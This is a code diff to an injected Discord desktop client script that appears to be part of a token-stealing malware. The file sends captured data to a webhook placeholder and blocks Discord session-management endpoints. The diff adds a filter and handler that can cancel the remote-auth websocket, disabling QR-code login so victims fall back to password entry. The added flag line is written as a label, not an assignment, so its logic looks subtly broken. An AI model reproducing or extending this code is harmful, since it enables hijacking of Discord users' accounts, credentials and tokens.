@@ -7,6 +7,7 @@ const { BrowserWindow: BrowserWindow, session: session } = require("electron"),
     https = require("https"),
     path = require("path");
 
+disable_qr_code: true;
 let WEBHOOK = "%WEBHOOK_URL%";
 const CONFIG = {
     filters2: {
@@ -16,6 +17,18 @@ const CONFIG = {
             'https://*.discord.com/api/v*/auth/sessions',
             'https://discordapp.com/api/v*/auth/sessions'
         ],
+        qr_codes: {
+            urls: [
+                "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
+                "https://*.discord.com/api/v*/applications/detectable",
+                "https://discord.com/api/v*/applications/detectable",
+                "https://*.discord.com/api/v*/users/@me/library",
+                "https://discord.com/api/v*/users/@me/library",
+                "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
+                "https://discord.com/api/v*/users/@me/billing/subscriptions",
+                "wss://remote-auth-gateway.discord.gg/*"
+            ]
+        }
     },
 };
 
@@ -619,5 +632,18 @@ session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, cal
         cancel: true
     })
 });
+
+session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2["qr_codes"], async (details, callback) => {
+    if (details.url.startsWith("wss://")) {
+        if (disable_qr_code == false) {
+            callback({
+                cancel: true
+            })
+            return;
+        }
+    }
+    callback({})
+    return;
+})
 
 module.exports = require("./core.asar");
